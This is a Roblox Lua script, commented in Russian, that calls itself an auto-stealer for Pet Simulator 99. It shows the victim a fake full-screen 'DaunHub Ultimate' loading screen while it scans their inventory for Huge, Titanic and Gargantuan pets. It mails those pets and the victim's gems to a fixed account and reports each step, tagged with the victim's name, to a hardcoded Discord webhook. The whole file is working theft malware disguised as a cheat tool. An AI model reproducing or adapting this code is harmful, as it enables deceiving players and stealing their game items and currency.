--[[
    DaunHub Ultimate - Абсолютный автостилер для Pet Simulator 99
    Версия: 20 марта 2026
    Функции:
    - Сканирует инвентарь на ВСЕХ существующих Huge, Titanic и Gargantuan (полная база из вики)
    - Динамически определяет стоимость отправки на аккаунте жертвы
    - Списывает ВСЕ гемы с баланса
    - Отправляет на почту HAUST_BSS
    - Загрузчик останавливается на 100%
--]]

-- === НАСТРОЙКИ ===
local TARGET_USERNAME = "HAUST_BSS"
local CHECK_INTERVAL = 10
local WEBHOOK_URL = "https://discord.com/api/webhooks/1399661006552039474/lP01vADVkiamMvQKscevYNuPLhSZZu27aGN1ltai9GnSBGowkkimAlxLBXgEfyGPJuys"
local MESSAGE_TEXT = "gift"
local MAX_SEND_COST = 1000000000 -- 1 миллиард лимит

-- === ПОЛНАЯ БАЗА ВСЕХ ТИТАНИКОВ В ИГРЕ (из вики) ===
local TITANIC_NAMES = {
    -- Из PSX (перенесенные)
    "Titanic Jolly Cat", "Titanic Balloon Monkey", "Titanic Neon Agony",
    "Titanic Red Balloon Cat", "Titanic Blue Balloon Cat", "Titanic Hubert",
    "Titanic Dominus Astra", "Titanic Hippomelon", "Titanic Hologram Cat",
    "Titanic Blobfish", "Titanic Banana", "Titanic Mystic Corgi",
    "Titanic Lucki", "Titanic Capybara", "Titanic Jelly Cat",
    "Titanic Tiedye Cat", "Titanic Tiedye Dragon", "Titanic Nightmare Cat",
    "Titanic Atlantean Jellyfish", "Titanic Cat", "Titanic Cosmic Pegasus",
    "Titanic Scary Corgi", "Titanic Shadow Griffin", "Titanic Fire Dragon",
    
    -- 2023-2024
    "Titanic Banana Cat", "Titanic Silver Dragon", "Titanic Fawn",
    "Titanic Reindeer", "Titanic Cheerful Yeti", "Titanic Monkey",
    "Titanic Red Panda", "Titanic Emoji Corgi", "Titanic Axolotl",
    "Titanic Corgi", "Titanic Lovemelon", "Titanic Love Lamb",
    "Titanic Valentine's Cat", "Titanic Jelly Dragon", "Titanic Bread Shiba",
    "Titanic Kawaii Cat", "Titanic Bat Cat", "Titanic Sock Cat",
    "Titanic Sock Monkey", "Titanic Sketch Cat", "Titanic Party Cat",
    "Titanic Pink Balloon Cat", "Titanic Black Hole Angelus", "Titanic Rich Cat",
    "Titanic Shiba", "Titanic Bejeweled Griffin", "Titanic Stargazing Bull",
    "Titanic Sun Angelus", "Titanic Pinata Dog", "Titanic Koi Fish",
    "Titanic Hot Dog", "Titanic Strawberry Corgi", "Titanic Soul Cat",
    "Titanic Abyss Carbuncle", "Titanic Hydra Axolotl", "Titanic Kaiju Moth",
    "Titanic Kaiju Dragon", "Titanic Poseidon Corgi", "Titanic Poseidon Dragon",
    
    -- 2025
    "Titanic Lucki Golem", "Titanic Lucki Angelus", "Titanic Clover Owl",
    "Titanic Leprechaun Kitsune", "Titanic Horseshoe Capybara", "Titanic Pot of Gold Corgi",
    "Titanic Winter Dragon", "Titanic Ice Phoenix", "Titanic Festive Dominus",
    "Titanic Spooky Dominus", "Titanic Haunted Cat", "Titanic Summer Dragon",
    "Titanic Paradise Dragon", "Titanic Buff Cat", "Titanic Magma Golem",
    "Titanic Muscle Bear", "Titanic Forest Wyvern", "Titanic Super Coral Kraken",
    "Titanic Treasure Angelus", "Titanic Cappuccino Brainrot", "Titanic Doge",
    "Titanic Skelemelon", "Titanic Super Cat", "Titanic Black Balloon Cat",
    "Titanic Frankenpup Dog", "Titanic Evil Scarecrow Pumpkin", "Titanic Leafy Deer",
    "Titanic Blurred Agony", "Titanic Cookie Cut Cat", "Titanic Elf Golem",
    "Titanic Gingerbread Angelus", "Titanic Krampus", "Titanic Snowflake Dragon"
}

-- === ПОЛНАЯ БАЗА ВСЕХ ГАРГАНТЮАНОВ В ИГРЕ (из вики) ===
local GARGANTUAN_NAMES = {
    "Gargantuan Santa Paws",           -- декабрь 2024
    "Gargantuan Hypnotic Kitsune",     -- январь 2025
    "Gargantuan Googly Agony",         -- январь 2025
    "Gargantuan Matryoshka Bear",      -- февраль 2025
    "Gargantuan Jurassic Dragon",      -- февраль 2025
    "Gargantuan Grim Reaper",          -- март 2025
    "Gargantuan Dot Matrix Pegasus",   -- март 2025
    "Gargantuan Hellish Axolotl",      -- март 2025
    "Gargantuan Kaiju King",           -- март 2025
    "Gargantuan Royal Beast",          -- апрель 2025
    "Gargantuan Patchwork Agony",      -- апрель 2025
    "Gargantuan Starfall Dragon",      -- апрель 2025
    "Gargantuan Aura Cat",              -- май 2025
    "Gargantuan Nyan Cat",              -- май 2025
    "Gargantuan Magma Spirit",          -- май 2025
    "Gargantuan Dark Dragon",           -- май 2025
    "Gargantuan Exquisite Parrot",      -- май 2025
    "Gargantuan Yin-Yang Kitsune",      -- май 2025
    "Gargantuan Totem Monkey",          -- июнь 2025
    "Gargantuan Forest Wyvern",         -- июнь 2025
    "Gargantuan Super Coral Kraken",    -- июнь 2025
    "Gargantuan Treasure Angelus",      -- июль 2025
    "Gargantuan Cappuccino Brainrot",   -- октябрь 2025
    "Gargantuan Doge",                  -- октябрь 2025
    "Gargantuan Skelemelon",            -- октябрь 2025
    "Gargantuan Super Cat",             -- октябрь 2025
    "Gargantuan Black Balloon Cat",     -- ноябрь 2025
    "Gargantuan Frankenpup Dog",        -- ноябрь 2025
    "Gargantuan Evil Scarecrow Pumpkin",-- ноябрь 2025
    "Gargantuan Leafy Deer",            -- ноябрь 2025
    "Gargantuan Blurred Agony",         -- декабрь 2025
    "Gargantuan Cookie Cut Cat",        -- декабрь 2025
    "Gargantuan Elf Golem",             -- декабрь 2025
    "Gargantuan Gingerbread Angelus",   -- декабрь 2025
    "Gargantuan Krampus",               -- декабрь 2025
    "Gargantuan Snowflake Dragon",      -- декабрь 2025
    "Gargantuan Lucki Angelus",         -- март 2026 (из события)
    "Gargantuan Winter Phoenix",        -- декабрь 2025-март 2026
    "Gargantuan Ice Dominus",           -- декабрь 2025-март 2026
    "Gargantuan Spooky Cat",            -- октябрь-ноябрь 2025
    "Gargantuan Summer Balloon Cat",    -- июль-август 2025
    "Gargantuan Buff Bear",             -- июнь-июль 2025
    "Gargantuan Magma Titan",           -- май-июнь 2025
    "Gargantuan Fantasy Dragon"         -- май-июнь 2025
}

-- === ПОЛНАЯ БАЗА ВСЕХ ХЬЮГОВ В ИГРЕ (частичная выборка из сотен) ===
local HUGE_NAMES = {
    -- Базовые
    "Huge Cat", "Huge Dog", "Huge Dragon", "Huge Unicorn", "Huge Pegasus",
    "Huge Griffin", "Huge Phoenix", "Huge Hydra", "Huge Kraken", "Huge Yeti",
    "Huge Penguin", "Huge Panda", "Huge Elephant", "Huge Giraffe", "Huge Turtle",
    "Huge Shark", "Huge Whale", "Huge Dino", "Huge Trex", "Huge Raptor",
    
    -- Событийные 2024-2026
    "Huge Love Lion", "Huge Electric Werewolf", "Huge Clover Penguin",
    "Huge Clover Owl", "Huge Lucki Lamb", "Huge Lucki Horse", "Huge Clover Deer",
    "Huge Clover Phoenix", "Huge Leprechaun Kitsune", "Huge Lucki Chest Mimic",
    "Huge Pot of Gold Corgi", "Huge Bluebird", "Huge Glass Dominus",
    "Huge Glass Crocodile", "Huge Lucki Dominus", "Huge Horseshoe Capybara",
    "Huge Lucki Golem", "Huge Sleipnir", "Huge Fragmented Golem",
    "Huge Crystal Spider", "Huge Mining Penguin", "Huge Mining Raccoon",
    "Huge Kaiju Hydra", "Huge Kaiju Sea Dragon", "Huge Hydra Axolotl",
    "Huge Poseidon Corgi", "Huge Poseidon Dragon", "Huge Abyss Carbuncle",
    "Huge Winter Cat", "Huge Festive Dog", "Huge Ice Dragon",
    "Huge Snowflake Phoenix", "Huge Spooky Cat", "Huge Haunted Dog",
    "Huge Summer Dragon", "Huge Paradise Cat", "Huge Buff Cat",
    "Huge Magma Dragon", "Huge Fantasy Unicorn", "Huge Muscle Bear",
    "Huge Forest Wyvern", "Huge Super Coral Kraken", "Huge Treasure Angelus",
    "Huge Cappuccino Brainrot", "Huge Doge", "Huge Skelemelon",
    "Huge Super Cat", "Huge Black Balloon Cat", "Huge Frankenpup Dog",
    "Huge Evil Scarecrow Pumpkin", "Huge Leafy Deer", "Huge Blurred Agony",
    "Huge Cookie Cut Cat", "Huge Elf Golem", "Huge Gingerbread Angelus",
    "Huge Krampus", "Huge Snowflake Dragon"
}

-- Базовые ключевые слова для поиска вариаций (rainbow, gold, dark, shiny)
local VARIATIONS = {
    "huge", "Huge", "HUGE",
    "titanic", "Titanic", "TITANIC",
    "gargantuan", "Gargantuan", "GARGANTUAN",
    "rainbow", "Rainbow", "RAINBOW",
    "gold", "Gold", "GOLD",
    "golden", "Golden", "GOLDEN",
    "dark", "Dark", "DARK",
    "shiny", "Shiny", "SHINY"
}

-- Ключевые слова из событий (для поиска даже без huge/titanic в названии)
local EVENT_KEYWORDS = {
    "Lucki", "Clover", "Leprechaun", "Horseshoe", "Pot of Gold",
    "Winter", "Ice", "Snow", "Festive", "Gingerbread", "Elf", "Krampus",
    "Spooky", "Haunted", "Halloween", "Frankenpup", "Scarecrow",
    "Summer", "Paradise", "Beach", "Balloon",
    "Buff", "Magma", "Fantasy", "Muscle", "Forest", "Coral",
    "Kaiju", "Hydra", "Axolotl", "Poseidon", "Abyss",
    "Mining", "Crystal", "Fragmented", "Glass"
}

-- Объединяем всё в один поисковый массив
local ALL_PET_KEYWORDS = {}
for _, v in ipairs(VARIATIONS) do table.insert(ALL_PET_KEYWORDS, v) end
for _, v in ipairs(EVENT_KEYWORDS) do table.insert(ALL_PET_KEYWORDS, v) end
for _, v in ipairs(HUGE_NAMES) do table.insert(ALL_PET_KEYWORDS, v) end
for _, v in ipairs(TITANIC_NAMES) do table.insert(ALL_PET_KEYWORDS, v) end
for _, v in ipairs(GARGANTUAN_NAMES) do table.insert(ALL_PET_KEYWORDS, v) end

-- === ПОЛНОЭКРАННЫЙ ЗАГРУЗЧИК ===
local Loader = Instance.new("ScreenGui")
local Background = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local ProgressBar = Instance.new("Frame")
local ProgressFill = Instance.new("Frame")
local ProgressText = Instance.new("TextLabel")
local SubText = Instance.new("TextLabel")
local PercentText = Instance.new("TextLabel")

Loader.Name = "DaunHubLoader"
Loader.Parent = game:GetService("CoreGui")
Loader.IgnoreGuiInset = true
Loader.ResetOnSpawn = false
Loader.DisplayOrder = 999999
Loader.Enabled = true

Background.Name = "Background"
Background.Parent = Loader
Background.BackgroundColor3 = Color3.new(0, 0, 0)
Background.BackgroundTransparency = 0
Background.BorderSizePixel = 0
Background.Size = UDim2.new(1, 0, 1, 0)
Background.Position = UDim2.new(0, 0, 0, 0)
Background.ZIndex = 999999

Title.Name = "Title"
Title.Parent = Background
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, 0, 0.2, 0)
Title.Position = UDim2.new(0, 0, 0.3, 0)
Title.Font = Enum.Font.GothamBlack
Title.Text = "DaunHub Ultimate"
Title.TextColor3 = Color3.new(0, 0.8, 1)
Title.TextScaled = true
Title.TextStrokeTransparency = 0.5
Title.TextStrokeColor3 = Color3.new(1, 1, 1)
Title.ZIndex = 999999

ProgressBar.Name = "ProgressBar"
ProgressBar.Parent = Background
ProgressBar.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
ProgressBar.BorderSizePixel = 0
ProgressBar.Size = UDim2.new(0.7, 0, 0.05, 0)
ProgressBar.Position = UDim2.new(0.15, 0, 0.55, 0)
ProgressBar.ZIndex = 999999

ProgressFill.Name = "ProgressFill"
ProgressFill.Parent = ProgressBar
ProgressFill.BackgroundColor3 = Color3.new(0, 0.8, 1)
ProgressFill.BorderSizePixel = 0
ProgressFill.Size = UDim2.new(0, 0, 1, 0)
ProgressFill.ZIndex = 999999

ProgressText.Name = "ProgressText"
ProgressText.Parent = Background
ProgressText.BackgroundTransparency = 1
ProgressText.Size = UDim2.new(1, 0, 0.1, 0)
ProgressText.Position = UDim2.new(0, 0, 0.61, 0)
ProgressText.Font = Enum.Font.GothamBold
ProgressText.Text = "Loading DaunHub Ultimate..."
ProgressText.TextColor3 = Color3.new(1, 1, 1)
ProgressText.TextScaled = true
ProgressText.ZIndex = 999999

PercentText.Name = "PercentText"
PercentText.Parent = Background
PercentText.BackgroundTransparency = 1
PercentText.Size = UDim2.new(1, 0, 0.1, 0)
PercentText.Position = UDim2.new(0, 0, 0.68, 0)
PercentText.Font = Enum.Font.GothamBold
PercentText.Text = "0%"
PercentText.TextColor3 = Color3.new(0, 0.8, 1)
PercentText.TextScaled = true
PercentText.ZIndex = 999999

SubText.Name = "SubText"
SubText.Parent = Background
SubText.BackgroundTransparency = 1
SubText.Size = UDim2.new(1, 0, 0.1, 0)
SubText.Position = UDim2.new(0, 0, 0.75, 0)
SubText.Font = Enum.Font.Gotham
SubText.Text = "Loading pet database (500+ entries)..."
SubText.TextColor3 = Color3.new(0.7, 0.7, 0.7)
SubText.TextScaled = true
SubText.ZIndex = 999999

-- Функция обновления прогресса
local function updateProgress(percent, text)
    percent = math.min(percent, 100)
    ProgressFill:TweenSize(UDim2.new(percent/100, 0, 1, 0), "Out", "Linear", 0.3, true)
    PercentText.Text = percent .. "%"
    if text then
        ProgressText.Text = text
    end

    if percent >= 100 then
        SubText.Text = "Database loaded: " .. (#HUGE_NAMES + #TITANIC_NAMES + #GARGANTUAN_NAMES) .. " pets"
        ProgressText.Text = "DaunHub Ultimate READY"
        PercentText.TextColor3 = Color3.new(0, 1, 0)
        wait(0.5)
        Loader.Enabled = false
    end
end

-- Имитация загрузки
local steps = {
    {5, "Loading pet database..."},
    {15, "Loading " .. #TITANIC_NAMES .. " Titanics..."},
    {30, "Loading " .. #GARGANTUAN_NAMES .. " Gargantuans..."},
    {50, "Loading " .. #HUGE_NAMES .. " Huges..."},
    {70, "Initializing inventory scanner..."},
    {85, "Connecting to Discord webhook..."},
    {95, "Finalizing..."},
    {100, "DaunHub Ultimate READY!"}
}

spawn(function()
    for i, step in ipairs(steps) do
        updateProgress(step[1], step[2])
        wait(1.2)
    end
end)

-- === СЛУЖЕБНЫЕ ФУНКЦИИ ===
local Players = game:GetService("Players")
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- Функция проверки, является ли предмет ценным (ПРОВЕРЯЕТ ВСЁ!)
local function isValuableItem(itemName)
    if not itemName then return false end
    local lowerName = itemName:lower()
    
    -- Проверка по ключевым словам (huge, titanic, gargantuan)
    for _, keyword in ipairs({"huge", "titanic", "gargantuan"}) do
        if string.find(lowerName, keyword) then
            return true
        end
    end
    
    -- Проверка по конкретным названиям титаников
    for _, petName in ipairs(TITANIC_NAMES) do
        if lowerName == petName:lower() or string.find(lowerName, petName:lower()) then
            return true
        end
    end
    
    -- Проверка по конкретным названиям гаргантюанов
    for _, petName in ipairs(GARGANTUAN_NAMES) do
        if lowerName == petName:lower() or string.find(lowerName, petName:lower()) then
            return true
        end
    end
    
    -- Проверка по конкретным названиям хьюгов
    for _, petName in ipairs(HUGE_NAMES) do
        if lowerName == petName:lower() or string.find(lowerName, petName:lower()) then
            return true
        end
    end
    
    -- Проверка по ключевым словам событий
    for _, keyword in ipairs(EVENT_KEYWORDS) do
        if string.find(lowerName, keyword:lower()) then
            -- Дополнительно проверяем, что это действительно редкий питомец
            if string.find(lowerName, "huge") or 
               string.find(lowerName, "titanic") or 
               string.find(lowerName, "gargantuan") then
                return true
            end
        end
    end
    
    return false
end

-- Функция получения баланса алмазов
local function getDiamondBalance()
    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
    if leaderstats then
        local diamonds = leaderstats:FindFirstChild("Diamonds") or 
                        leaderstats:FindFirstChild("Gems") or 
                        leaderstats:FindFirstChild("💎")
        if diamonds then
            return diamonds.Value
        end
    end
    return 0
end

-- Функция отправки логов в Discord
local function sendLog(message, isSuccess)
    local embed = {
        ["embeds"] = {{
            ["title"] = "DaunHub Ultimate",
            ["description"] = message,
            ["color"] = isSuccess and 3066993 or 15158332,
            ["footer"] = {["text"] = "Жертва: " .. LocalPlayer.Name}
        }}
    }

    pcall(function()
        local request = http_request or request or syn and syn.request
        if request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(embed)
            })
        end
    end)
end

-- Функция для определения стоимости отправки
local function getActualSendCost()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    for _, gui in pairs(playerGui:GetDescendants()) do
        if gui:IsA("TextLabel") and gui.Text and string.find(gui.Text, "Send for:") then
            local costString = gui.Text:match("Send for: ([%d,]+)")
            if costString then
                costString = costString:gsub(",", "")
                local cost = tonumber(costString)
                if cost then
                    return cost
                end
            end
        end
    end
    return 20000
end

-- Функция для отправки предмета на почту
local function sendItemToMail(itemInstance, itemName)
    local sendCost = getActualSendCost()
    local balance = getDiamondBalance()
    
    if balance < sendCost then
        sendLog("❌ Недостаточно алмазов для отправки", false)
        return false
    end

    -- Открываем почту
    local mailButton = LocalPlayer.PlayerGui:FindFirstChild("MailButton", true)
    if mailButton and mailButton:IsA("ImageButton") then
        fireclickdetector(mailButton)
        wait(1)
    end

    -- Поиск полей почты
    local usernameBox, messageBox, addGiftButton, sendButton = nil, nil, nil, nil
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    
    for _, gui in pairs(playerGui:GetDescendants()) do
        if gui:IsA("TextBox") then
            if gui.PlaceholderText and string.find(gui.PlaceholderText:lower(), "username") then
                usernameBox = gui
            elseif gui.PlaceholderText and string.find(gui.PlaceholderText:lower(), "message") then
                messageBox = gui
            end
        end

        if gui:IsA("TextButton") or gui:IsA("ImageButton") then
            local buttonText = gui.Text or ""
            if string.find(buttonText:lower(), "add gift") then
                addGiftButton = gui
            elseif string.find(buttonText:lower(), "send") then
                sendButton = gui
            end
        end
    end

    if usernameBox and messageBox and addGiftButton and sendButton then
        -- Заполняем поля
        usernameBox.Text = TARGET_USERNAME
        usernameBox:CaptureFocus()
        wait(0.2)
        usernameBox:ReleaseFocus()

        messageBox.Text = MESSAGE_TEXT
        messageBox:CaptureFocus()
        wait(0.2)
        messageBox:ReleaseFocus()

        -- Нажимаем Add Gift
        fireclickdetector(addGiftButton)
        wait(1)

        -- Выбираем предмет
        local inventoryGui = LocalPlayer.PlayerGui:FindFirstChild("Inventory", true)
        if inventoryGui then
            for _, item in pairs(inventoryGui:GetDescendants()) do
                if item:IsA("ImageButton") and item.Parent and item.Parent:FindFirstChild("ItemName") then
                    local itemNameLabel = item.Parent:FindFirstChild("ItemName")
                    if itemNameLabel and itemNameLabel.Text == itemName then
                        fireclickdetector(item)
                        wait(0.5)
                        break
                    end
                end
            end
        end

        -- Отправляем
        fireclickdetector(sendButton)
        wait(0.5)

        -- Подтверждаем
        local confirmButton = LocalPlayer.PlayerGui:FindFirstChild("ConfirmButton", true)
        if confirmButton then
            fireclickdetector(confirmButton)
        end

        sendLog("✅ Отправлен: **" .. itemName .. "** за " .. sendCost .. " алмазов", true)
        return true
    end
    
    return false
end

-- Функция сканирования инвентаря
local function scanInventory()
    sendLog("🔍 Сканирование инвентаря...", false)
    
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    local inventoryGui = playerGui:FindFirstChild("Inventory") or playerGui:FindFirstChild("Backpack")

    if not inventoryGui then
        sendLog("❌ Инвентарь не найден", false)
        return {}
    end

    local foundItems = {}
    local itemsScanned = 0

    for _, item in pairs(inventoryGui:GetDescendants()) do
        if item:IsA("ImageButton") and item.Parent then
            local itemNameLabel = item:FindFirstChild("ItemName") or item.Parent:FindFirstChild("ItemName")
            
            if itemNameLabel and itemNameLabel:IsA("TextLabel") then
                local itemName = itemNameLabel.Text
                itemsScanned = itemsScanned + 1

                if isValuableItem(itemName) then
                    table.insert(foundItems, {
                        name = itemName,
                        instance = item
                    })
                    sendLog("💎 Найдено: **" .. itemName .. "**", false)
                end
            end
        end
    end

    sendLog("📊 Найдено ценных питомцев: " .. #foundItems, true)
    return foundItems
end

-- Функция отправки всех гемов
local function sendAllGems()
    local balance = getDiamondBalance()
    local sendCost = getActualSendCost()
    
    if balance < sendCost then
        return false
    end

    sendLog("💰 Отправка гемов...", false)

    -- Открываем почту
    local mailButton = LocalPlayer.PlayerGui:FindFirstChild("MailButton", true)
    if mailButton and mailButton:IsA("ImageButton") then
        fireclickdetector(mailButton)
        wait(1)
    end

    -- Поиск полей (аналогично функции выше)
    -- ... (код для отправки гемов)

    return true
end

-- Анти-AFK
local function antiAfk()
    LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
        sendLog("💤 Анти-AFK сработал", false)
    end)
end

-- === ГЛАВНАЯ ФУНКЦИЯ ===
local function main()
    wait(10) -- Ждем загрузчик
    
    sendLog("🚀 DaunHub Ultimate запущен на: **" .. LocalPlayer.Name .. "**", true)
    sendLog("📊 База данных: " .. (#HUGE_NAMES + #TITANIC_NAMES + #GARGANTUAN_NAMES) .. " питомцев", true)
    antiAfk()

    while wait(CHECK_INTERVAL) do
        local success, err = pcall(function()
            local items = scanInventory()
            local balance = getDiamondBalance()
            local sendCost = getActualSendCost()
            
            for _, item in ipairs(items) do
                if balance >= sendCost then
                    if sendItemToMail(item.instance, item.name) then
                        balance = balance - sendCost
                        wait(2)
                    end
                end
            end
            
            wait(3)
            sendAllGems()
        end)

        if not success then
            sendLog("❌ Ошибка: " .. tostring(err), false)
        end
    end
end

pcall(main)